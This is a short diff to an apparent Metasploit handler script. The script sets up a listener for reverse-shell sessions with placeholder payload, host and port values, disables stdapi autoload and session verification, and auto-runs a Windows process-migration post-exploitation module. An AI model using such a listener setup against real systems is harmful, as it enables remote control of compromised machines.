@@ -2,6 +2,8 @@ use exploit/multi/handler
 set PAYLOAD aaa
 set LHOST bbb
 set LPORT ccc
+set AutoLoadStdapi false
+set AutoVerifySession false
 set AutoRunScript post/windows/manage/migrate
 set ExitOnSession false
 exploit -j
